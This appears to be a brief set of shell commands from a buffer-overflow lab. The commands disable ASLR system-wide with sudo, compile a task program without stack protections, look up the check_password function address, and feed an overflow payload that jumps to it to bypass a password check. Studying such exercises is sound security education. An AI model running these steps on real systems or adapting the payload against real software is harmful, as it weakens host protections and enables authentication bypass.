echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
gcc -fno-stack-protector -z execstack -no-pie -g -o check-pwd task-4.c
objdump -t check-pwd | grep check_password
echo -n -e "AAAAAAAAAAAAAAAA\x46\x11\x40\x00" | ./check-pwd
